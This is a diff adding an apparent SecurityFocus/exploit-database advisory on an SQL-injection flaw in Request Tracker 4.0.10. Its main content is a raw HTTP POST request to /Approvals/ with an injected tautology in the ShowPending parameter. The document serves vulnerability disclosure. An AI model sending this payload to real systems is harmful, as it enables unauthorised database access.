@@ -1,0 +1,21 @@
+source: http://www.securityfocus.com/bid/59022/info
+
+Request Tracker is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied input before using it in an SQL query.
+
+Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+RT 4.0.10 is vulnerable; other versions may also be affected. 
+
+POST /Approvals/ HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Cookie: RT_SID_example.com.80=7c120854a0726239b379557f024cc1cb
+Accept-Language: en-US
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Referer: http://www.example.com/Approvals/
+Host: 10.10.10.70
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; 
+Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 
+3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
+Content-Length: 120
+
+ShowPending=1%27+and+%27f%27%3D%27f%27%29+--+&ShowResolved=1&ShowRejected=1&ShowDependent=1&CreatedBefore=&CreatedAfter=
